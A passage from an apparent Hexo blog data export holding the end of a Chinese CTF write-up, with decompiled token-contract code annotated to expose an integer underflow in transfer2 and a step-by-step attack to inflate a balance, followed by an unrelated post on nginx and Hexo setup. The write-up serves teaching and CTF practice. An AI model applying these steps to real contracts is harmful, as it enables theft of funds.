gift要为0，指新用户</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (storage[keccak256(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x40</span>])]) &#123; revert(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x00</span>]); &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"comment\">// gift和balance都变为1，薅第一次羊毛</span></span><br><span class=\"line\">        memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x20</span>] = msg.sender;</span><br><span class=\"line\">        memory[<span class=\"number\">0x20</span>:<span class=\"number\">0x40</span>] = <span class=\"number\">0x00</span>;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> temp0 = keccak256(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x40</span>]);</span><br><span class=\"line\">        storage[temp0] = storage[temp0] + <span class=\"number\">0x01</span>;</span><br><span class=\"line\">        memory[<span class=\"number\">0x20</span>:<span class=\"number\">0x40</span>] = <span class=\"number\">0x01</span>;</span><br><span class=\"line\">        storage[keccak256(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x40</span>])] = <span class=\"number\">0x01</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">profit</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x20</span>] = msg.sender;</span><br><span class=\"line\">        memory[<span class=\"number\">0x20</span>:<span class=\"number\">0x40</span>] = <span class=\"number\">0x00</span>;</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\">//balanceOf 必须是1</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (storage[keccak256(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x40</span>])] != <span class=\"number\">0x01</span>) &#123; revert(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x00</span>]); &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">        memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x20</span>] = msg.sender;</span><br><span class=\"line\">        memory[<span class=\"number\">0x20</span>:<span class=\"number\">0x40</span>] = <span class=\"number\">0x01</span>;</span><br><span class=\"line\">        <span class=\"comment\">// gift 必须是1</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (storage[keccak256(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x40</span>])] != <span class=\"number\">0x01</span>) &#123; revert(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x00</span>]); &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"comment\">// 都加1</span></span><br><span class=\"line\">        memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x20</span>] = msg.sender;</span><br><span class=\"line\">        memory[<span class=\"number\">0x20</span>:<span class=\"number\">0x40</span>] = <span class=\"number\">0x00</span>;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> temp0 = keccak256(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x40</span>]);</span><br><span class=\"line\">        storage[temp0] = storage[temp0] + <span class=\"number\">0x01</span>;</span><br><span class=\"line\">        memory[<span class=\"number\">0x20</span>:<span class=\"number\">0x40</span>] = <span class=\"number\">0x01</span>;</span><br><span class=\"line\">        storage[keccak256(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x40</span>])] = <span class=\"number\">0x02</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// getFlag，太长了不看，反正给了源码</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">func_0278</span>(<span class=\"params\">var arg0</span>) </span>&#123;</span><br><span class=\"line\">        memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x20</span>] = msg.sender;</span><br><span class=\"line\">        memory[<span class=\"number\">0x20</span>:<span class=\"number\">0x40</span>] = <span class=\"number\">0x00</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"number\">0x2710</span> &gt; storage[keccak256(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x40</span>])]) &#123; revert(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x00</span>]); &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"keyword\">var</span> var0 = <span class=\"number\">0xb1bc9a9c599feac73a94c3ba415fa0b75cbe44496bfda818a9b4a689efb7adba</span>;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> var1 = <span class=\"number\">0x01</span>;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> temp0 = arg0;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> var2 = temp0;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> temp1 = memory[<span class=\"number\">0x40</span>:<span class=\"number\">0x60</span>];</span><br><span class=\"line\">        <span class=\"keyword\">var</span> var3 = temp1;</span><br><span class=\"line\">        memory[var3:var3 + <span class=\"number\">0x20</span>] = var1;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> temp2 = var3 + <span class=\"number\">0x20</span>;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> var4 = temp2;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> temp3 = var4 + <span class=\"number\">0x20</span>;</span><br><span class=\"line\">        memory[var4:var4 + <span class=\"number\">0x20</span>] = temp3 - var3;</span><br><span class=\"line\">        memory[temp3:temp3 + <span class=\"number\">0x20</span>] = memory[var2:var2 + <span class=\"number\">0x20</span>];</span><br><span class=\"line\">        <span class=\"keyword\">var</span> var5 = temp3 + <span class=\"number\">0x20</span>;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> var7 = memory[var2:var2 + <span class=\"number\">0x20</span>];</span><br><span class=\"line\">        <span class=\"keyword\">var</span> var6 = var2 + <span class=\"number\">0x20</span>;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> var8 = var7;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> var9 = var5;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> var10 = var6;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> var11 = <span class=\"number\">0x00</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (var11 &gt;= var8) &#123;</span><br><span class=\"line\">        label_02FD:</span><br><span class=\"line\">            <span class=\"keyword\">var</span> temp4 = var7;</span><br><span class=\"line\">            var5 = temp4 + var5;</span><br><span class=\"line\">            var6 = temp4 &amp; <span class=\"number\">0x1f</span>;</span><br><span class=\"line\">        </span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!var6) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> temp5 = memory[<span class=\"number\">0x40</span>:<span class=\"number\">0x60</span>];</span><br><span class=\"line\">                log(memory[temp5:temp5 + var5 - temp5], [stack[<span class=\"number\">-7</span>]]);</span><br><span class=\"line\">                <span class=\"keyword\">return</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> temp6 = var6;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> temp7 = var5 - temp6;</span><br><span class=\"line\">                memory[temp7:temp7 + <span class=\"number\">0x20</span>] = ~(<span class=\"number\">0x0100</span> ** (<span class=\"number\">0x20</span> - temp6) - <span class=\"number\">0x01</span>) &amp; memory[temp7:temp7 + <span class=\"number\">0x20</span>];</span><br><span class=\"line\">                <span class=\"keyword\">var</span> temp8 = memory[<span class=\"number\">0x40</span>:<span class=\"number\">0x60</span>];</span><br><span class=\"line\">                log(memory[temp8:temp8 + (temp7 + <span class=\"number\">0x20</span>) - temp8], [stack[<span class=\"number\">-7</span>]]);</span><br><span class=\"line\">                <span class=\"keyword\">return</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        label_02EE:</span><br><span class=\"line\">            <span class=\"keyword\">var</span> temp9 = var11;</span><br><span class=\"line\">            memory[temp9 + var9:temp9 + var9 + <span class=\"number\">0x20</span>] = memory[temp9 + var10:temp9 + var10 + <span class=\"number\">0x20</span>];</span><br><span class=\"line\">            var11 = temp9 + <span class=\"number\">0x20</span>;</span><br><span class=\"line\">        </span><br><span class=\"line\">            <span class=\"keyword\">if</span> (var11 &gt;= var8) &#123; goto label_02FD; &#125;</span><br><span class=\"line\">            <span class=\"keyword\">else</span> &#123; goto label_02EE; &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">balanceOf</span>(<span class=\"params\">var arg0</span>) <span class=\"title\">returns</span> (<span class=\"params\">var arg0</span>) </span>&#123;</span><br><span class=\"line\">        memory[<span class=\"number\">0x20</span>:<span class=\"number\">0x40</span>] = <span class=\"number\">0x00</span>;</span><br><span class=\"line\">        memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x20</span>] = arg0;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> storage[keccak256(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x40</span>])];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">transfer2</span>(<span class=\"params\">var arg0, var arg1</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 转的钱要大于等于3</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (arg1 &lt;= <span class=\"number\">0x02</span>) &#123; revert(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x00</span>]); &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"comment\">// balanceOf</span></span><br><span class=\"line\">        memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x20</span>] = msg.sender;</span><br><span class=\"line\">        memory[<span class=\"number\">0x20</span>:<span class=\"number\">0x40</span>] = <span class=\"number\">0x00</span>;</span><br><span class=\"line\">        <span class=\"comment\">// balanceOf 要大于等于3</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"number\">0x02</span> &gt;= storage[keccak256(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x40</span>])]) &#123; revert(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x00</span>]); &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">        memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x20</span>] = msg.sender;</span><br><span class=\"line\">        memory[<span class=\"number\">0x20</span>:<span class=\"number\">0x40</span>] = <span class=\"number\">0x00</span>;</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\">// require(balanceOf[address] - data &gt; 0)</span></span><br><span class=\"line\">        <span class=\"comment\">// _sissel_ 整数溢出 uint256</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (storage[keccak256(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x40</span>])] - arg1 &lt;= <span class=\"number\">0x00</span>) &#123; revert(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x00</span>]); &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">        memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x20</span>] = msg.sender;</span><br><span class=\"line\">        memory[<span class=\"number\">0x20</span>:<span class=\"number\">0x40</span>] = <span class=\"number\">0x00</span>;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> temp0 = keccak256(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x40</span>]);</span><br><span class=\"line\">        <span class=\"keyword\">var</span> temp1 = arg1;</span><br><span class=\"line\">        <span class=\"comment\">// 自己的账户 - temp1</span></span><br><span class=\"line\">        storage[temp0] = storage[temp0] - temp1;</span><br><span class=\"line\">        memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x20</span>] = arg0 &amp; <span class=\"number\">0xffffffffffffffffffffffffffffffffffffffff</span>;</span><br><span class=\"line\">        <span class=\"comment\">// 别人的账户 + temp1</span></span><br><span class=\"line\">        <span class=\"keyword\">var</span> temp2 = keccak256(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x40</span>]);</span><br><span class=\"line\">        storage[temp2] = temp1 + storage[temp2];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">transfer</span>(<span class=\"params\">var arg0, var arg1</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 转的钱要大于等于2，profit()后的状态正好满足</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (arg1 &lt;= <span class=\"number\">0x01</span>) &#123; revert(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x00</span>]); &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">        memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x20</span>] = msg.sender;</span><br><span class=\"line\">        memory[<span class=\"number\">0x20</span>:<span class=\"number\">0x40</span>] = <span class=\"number\">0x00</span>;</span><br><span class=\"line\">        <span class=\"comment\">// balanceOf 要大于等于2</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"number\">0x01</span> &gt;= storage[keccak256(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x40</span>])]) &#123; revert(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x00</span>]); &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x20</span>] = msg.sender;</span><br><span class=\"line\">        memory[<span class=\"number\">0x20</span>:<span class=\"number\">0x40</span>] = <span class=\"number\">0x00</span>;</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\">// 贼安全，哈哈</span></span><br><span class=\"line\">        <span class=\"comment\">// require(balanceof[address]&gt;=arg1)</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (arg1 &gt; storage[keccak256(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x40</span>])]) &#123; revert(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x00</span>]); &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">        memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x20</span>] = msg.sender;</span><br><span class=\"line\">        memory[<span class=\"number\">0x20</span>:<span class=\"number\">0x40</span>] = <span class=\"number\">0x00</span>;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> temp0 = keccak256(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x40</span>]);</span><br><span class=\"line\">        <span class=\"keyword\">var</span> temp1 = arg1;</span><br><span class=\"line\">        storage[temp0] = storage[temp0] - temp1;</span><br><span class=\"line\">        memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x20</span>] = arg0 &amp; <span class=\"number\">0xffffffffffffffffffffffffffffffffffffffff</span>;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> temp2 = keccak256(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x40</span>]);</span><br><span class=\"line\">        storage[temp2] = temp1 + storage[temp2];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">func_0417</span>(<span class=\"params\">var arg0</span>) <span class=\"title\">returns</span> (<span class=\"params\">var arg0</span>) </span>&#123;</span><br><span class=\"line\">        memory[<span class=\"number\">0x20</span>:<span class=\"number\">0x40</span>] = <span class=\"number\">0x01</span>;</span><br><span class=\"line\">        memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x20</span>] = arg0;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> storage[keccak256(memory[<span class=\"number\">0x00</span>:<span class=\"number\">0x40</span>])];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>因为合约比较简单，大家去找几个bank合约对照一下就看懂了。先多看智能合约，再来看逆向，会简单很多。</p>\n<h3 id=\"攻击过程\"><a href=\"#攻击过程\" class=\"headerlink\" title=\"攻击过程\"></a>攻击过程</h3><ul>\n<li>我们最终需要balance很大，那就需要用transfer2构造一个整数溢出。</li>\n<li>transfer2需要账户余额大于等于3。</li>\n<li>init可以让账户变为1，profit可以让账户由1变2。</li>\n<li>transfer 没有溢出，但只需要balance大于等于2就可以用。</li>\n</ul>\n<ol>\n<li>账号1 init() 注意：这个函数的名字不知道，要用四字节码调用。</li>\n<li>账号1 profit()</li>\n<li>账号2 init() 注意：同1</li>\n<li>账号2 profit()</li>\n<li>账号1 transfer(账户2,2)</li>\n<li>账号2 transfer2(账户3, 2**256-1) 给账户3，此函数有下溢</li>\n<li>目标账户 getflag()</li>\n</ol>\n<p>以四字节码调用合约，可以用python发包，或者写攻击合约代发，或者找一些钱包，支持修改data字段的都行。看攻击过程的话，可以看f61d的师傅的，是event里第四个地址【前三个是我。。当时收不到邮件，试了好半天，我当时是用攻击合约写的，不太清晰】。</p>"},{"title":"搭blog服务器","date":"2019-03-16T22:46:28.000Z","_content":"\n\"我搭了一个服务器，吼吼\"\n\n在vultr租了3.5刀一个月的服务器，然后要把他折腾成 个人网站/博客+酸酸两用的服务器嗝，记录一下都做了哪些配置。\n\n<!-- more -->\n\n> 这写文章的风格咋和一个大一小朋友一样哈哈\n \n## nginx \n\n首先是购买域名，买了[www.aisissel.cn](www.aississl.cn) ，和自己公众号[AiSissel]一样耶，稍微规划一下二级域名\n\n- blog.aisissel.cn 用来做博客\n- [*.\\]*aisissel.cn 其他用来做个人主页\n\n然后酸酸开在高端口上，还要去签一个证书，[腾讯云-申请证书](https://console.cloud.tencent.com/ssl) ，启动~\n\n![](https://md.byr.moe/uploads/upload_287a5e563f04f1883ca78fcd99c07eb7.png)\n\n然后看看配一下nginx~\n\n![](https://md.byr.moe/uploads/upload_0e947d7f43b85fab7c0b8d6ba4b7ff5c.png)\n\n写一下配置哈哈\n\n```nginx\nserver {\n    listen 443 ssl default_server;\n    listen [::]:443 ssl default_server;\n\n    server_name blog.aisissel.cn;\n\n    ssl on;\n    ssl_certificate /xxxxx/blog.aisissel.cn.pem;\n    ssl_certificate_key /xxxxx/blog.aisissel.cn.key;\n    ssl_session_timeout 5m;\n    ssl_protocols TLSv1 TLSv1.1 TLSv1.2;\n    ssl_ciphers AESGCM:ALL:!DH:!EXPORT:!RC4:+HIGH:!MEDIUM:!LOW:!aNULL:!eNULL;\n    ssl_prefer_server_ciphers on;\n\n        location / {\n                proxy_pass http://127.0.0.1:4000;\n        }\n}\n\nserver {\n    listen 443 ssl;\n    listen [::]:443 ssl;\n\n    server_name www.aisissel.cn aisissel.cn;\n    ssl on;\n    # 这里这里，为什么我两个域名用了同一个证书呀？\n    ssl_certificate /xxxxx/aisissel.cn.pem;\n    ssl_certificate_key /xxxxx/aisissel.cn.key;\n    ssl_session_timeout 5m;\n    ssl_protocols TLSv1 TLSv1.1 TLSv1.2;\n    ssl_ciphers AESGCM:ALL:!DH:!EXPORT:!RC4:+HIGH:!MEDIUM:!LOW:!aNULL:!eNULL;\n    ssl_prefer_server_ciphers on;\n   \n    root /var/www/html;\n    \n    index index.html index.htm index.php;\n\n    location / {\n    }\n}\n\n\nserver {\n    listen       80;\n    server_name  aisissel.cn www.aisissel.cn blog.aisissel.cn;\n    rewrite ^(.*) https://$host$1 permanent;\n}\n```\n\n有一个小问题，为什么我两个域名，用了同一个证书，还没问题呢？\n\n## 再配hexo\n\nhexo是一个基于nodejs的，支持md，非常好用的博客框架，总之就是非常厉害吼吼。\n\nhttps://hexo.io/zh-cn/\n\n安装非常简单，配一些基本的内容，装了些主题和插件就ok了。\n\n主题：Archer\n\n\n","source":"_posts/create-blog.md","raw":"---\ntitle: 搭blog服务器\ndate: 2019-03-17 06:46:28\ntags:\n- 服务器\n- nginx\n---\n\n\"我搭了一个服务器，吼吼\"\n\n在vultr租了3.5刀一个月的服务器，然后要把他折腾成 个人网站/博客+酸酸两用的服务器嗝，记录一下都做了哪些配置。\n\n<!-- more -->\n\n> 这写文章的风格咋和一个大一小朋友一样哈哈\n \n## nginx \n\n首先是购买域名，买了[www.aisissel.cn](www.aississl.cn) ，和自己公众号[AiSissel]一样耶，稍微规划一下二级域名\n\n- blog.aisissel.cn 用来做博客\n- [*.\\]*aisissel.cn 其他用来做个人主页\n\n然后酸酸开在高端口上，还要去签一个证书，[腾讯云-申请证书](https://console.cloud.tencent.com/ssl) ，启动~\n\n![](https://md.byr.moe/uploads/upload_287a5e563f04f1883ca78fcd99c07eb7.png)\n\n然后看看配一下nginx~\n\n![](https://md.byr.moe/uploads/upload_0e947d7f43b85fab7c0b8d6ba4b7ff5c.png)\n\n写一下配置哈哈\n\n```nginx\nserver {\n    listen 443 ssl default_server;\n    listen [::]:443 ssl default_server;\n\n    server_name blog.aisissel.cn;\n\n    ssl on;\n    ssl_certificate /xxxxx/blog.aisissel.cn.pem;\n    ssl_certificate_key /xxxxx/blog.aisissel.cn.key;\n    ssl_session_timeout 5m;\n    ssl_protocols TLSv1 TLSv1.1 TLSv1.2;\n    ssl_ciphers AESGCM:ALL:!DH:!EXPORT:!RC4:+HIGH:!MEDIUM:!LOW:!aNULL:!eNULL;\n    ssl_prefer_server_ciphers on;\n\n        location / {\n                proxy_pass http://127.0.0.1:4000;\n        }\n}\n\nserver {\n    listen 443 ssl;\n    listen [::]:443 ssl;\n\n    server_name www.aisissel.cn aisissel.cn;\n    ssl on;\n    # 这里这里，为什么我两个域名用了同一个证书呀？\n    ssl_certificate /xxxxx/aisissel.cn.pem;\n    ssl_certificate_key /xxxxx/aisissel.cn.key;\n    ssl_session_timeout 5m;\n    ssl_protocols TLSv1 TLSv1.1 TLSv1.2;\n    ssl_ciphers AESGCM:ALL:!DH:!EXPORT:!RC4:+HIGH:!MEDIUM:!LOW:!aNULL:!eNULL;\n    ssl_prefer_server_ciphers on;\n   \n    root /var/www/html;\n    \n    index index.html index.htm index.php;\n\n    location / {\n    }\n}\n\n\nserver {\n    listen       80;\n    server_name  aisissel.cn www.aisissel.cn blog.aisissel.cn;\n    rewrite ^(.*) https://$host$1 permanent;\n}\n```\n\n有一个小问题，为什么我两个域名，用了同一个证书，还没问题呢？\n\n## 再配hexo\n\nhexo是一个基于nodejs的，支持md，非常好用的博客框架，总之就是非常厉害吼吼。\n\nhttps://hexo.io/zh-cn/\n\n安装非常简单，配一些基本的内容，装了些主题和插件就ok了。\n\n主题：Archer\n\n\n","slug":"create-blog","published":1,"updated":"2020-02-19T07:29:18.236Z","_id":"ck6rlh7tb000221vw34sw5vrj","comments":1,"layout":"post","photos":[],"link":"","content":"<p>“我搭了一个服务器，吼吼”</p>\n<p>在vultr租了3.5刀一个月的服务器，然后要把他折腾成 个人网站/博客+酸酸两用的服务器嗝，记录一下都做了哪些配置。</p>\n<a id=\"more\"></a>\n<blockquote>\n<p>这写文章的风格咋和一个大一小朋友一样哈哈</p>\n</blockquote>\n<h2 id=\"nginx\"><a href=\"#nginx\" class=\"headerlink\" title=\"nginx\"></a>nginx</h2><p>首先是购买域名，买了<a href=\"www.aississl.cn\">www.aisissel.cn</a> ，和自己公众号[AiSissel]一样耶，稍微规划一下二级域名</p>\n<ul>\n<li>blog.aisissel.cn 用来做博客</li>\n<li>[<em>.]</em>aisissel.cn 其他用来做个人主页</li>\n</ul>\n<p>然后酸酸开在高端口上，还要去签一个证书，<a href=\"https://console.cloud.tencent.com/ssl\" target=\"_blank\" rel=\"noopener\">腾讯云-申请证书</a> ，启动~</p>\n<p><img src=\"https://md.byr.moe/uploads/upload_287a5e563f04f1883ca78fcd99c07eb7.png\" alt></p>\n<p>然后看看配一下nginx~</p>\n<p><img src=\"https://md.byr.moe/uploads/upload_0e947d7f43b85fab7c0b8d6ba4b7ff5c.png\" alt></p>\n<p>写一下配置哈哈</p>\n<figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">server</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">listen</span> <span class=\"number\">443</span> ssl default_server;</span><br><span class=\"line\">    <span class=\"attribute\">listen</span> [::]:<span class=\"number\">443</span> ssl default_server;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"attribute\">server_name</span> blog.aisissel.cn;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"attribute\">ssl</span> <span class=\"literal\">on</span>;</span><br><span class=\"line\">    <span class=\"attribute\">ssl_certificate</span> /xxxxx/blog.aisissel.cn.pem;</span><br><span class=\"line\">    <span class=\"attribute\">ssl_certificate_key</span> /xxxxx/blog.aisissel.cn.key;</span><br><span class=\"line\">    <span class=\"attribute\">ssl_session_timeout</span> <span class=\"number\">5m</span>;</span><br><span class=\"line\">    <span class=\"attribute\">ssl_protocols</span> TLSv1 TLSv1.<span class=\"number\">1</span> TLSv1.<span class=\"number\">2</span>;</span><br><span class=\"line\">    <span class=\"attribute\">ssl_ciphers</span> AESGCM:ALL:!DH:!EXPORT:!RC4:+HIGH:!MEDIUM:!LOW:!aNULL:!eNULL;</span><br><span class=\"line\">    <span class=\"attribute\">ssl_prefer_server_ciphers</span> <span class=\"literal\">on</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"attribute\">location</span> / &#123;</span><br><span class=\"line\">                <span class=\"attribute\">proxy_pass</span> http://127.0.0.1:4000;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">server</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">listen</span> <span class=\"number\">443</span> ssl;</span><br><span class=\"line\">    <span class=\"attribute\">listen</span> [::]:<span class=\"number\">443</span> ssl;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"attribute\">server_name</span> www.aisissel.cn aisissel.cn;</span><br><span class=\"line\">    <span class=\"attribute\">ssl</span> <span class=\"literal\">on</span>;</span><br><span class=\"line\">    <span class=\"comment\"># 这里这里，为什么我两个域名用了同一个证书呀？</span></span><br><span class=\"line\">    <span class=\"attribute\">ssl_certificate</span> /xxxxx/aisissel.cn.pem;</span><br><span class=\"line\">    <span class=\"attribute\">ssl_certificate_key</span> /xxxxx/aisissel.cn.key;</span><br><span class=\"line\">    <span class=\"attribute\">ssl_session_timeout</span> <span class=\"number\">5m</span>;</span><br><span class=\"line\">    <span class=\"attribute\">ssl_protocols</span> TLSv1 TLSv1.<span class=\"number\">1</span> TLSv1.<span class=\"number\">2</span>;</span><br><span class=\"line\">    <span class=\"attribute\">ssl_ciphers</span> AESGCM:ALL:!DH:!EXPORT:!RC4:+HIGH:!MEDIUM:!LOW:!aNULL:!eNULL;</span><br><span class=\"line\">    <span class=\"attribute\">ssl_prefer_server_ciphers</span> <span class=\"literal\">on</span>;</span><br><span class=\"line\">   </span><br><span class=\"line\">    <span class=\"attribute\">root</span> /var/www/html;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"attribute\">index</span> index.html index.htm index.php;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"attribute\">location</span> / &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">server</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">listen</span>       <span class=\"number\">80</span>;</span><br><span class=\"line\">    <span class=\"attribute\">server_name</span>  aisissel.cn www.aisissel.cn blog.aisissel.cn;</span><br><span class=\"line\">    <span class=\"attribute\">rewrite</span><span class=\"regexp\"> ^(.*)</span> https://<span class=\"variable\">$host</span><span class=\"variable\">$1</span> <span class=\"literal\">permanent</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>有一个小问题，为什么我两个域名，用了同一个证书，还没问题呢？</p>\n<h2 id=\"再配hexo\"><a href=\"#再配hexo\" class=\"headerlink\" title=\"再配hexo\"></a>再配hexo</h2><p>hexo是一个基于nodejs的，支持md，非常好用的博客框架，总之就是非常厉害吼吼。</p>\n<p><a href=\"https://hexo.io/zh-cn/\" target=\"_blank\" 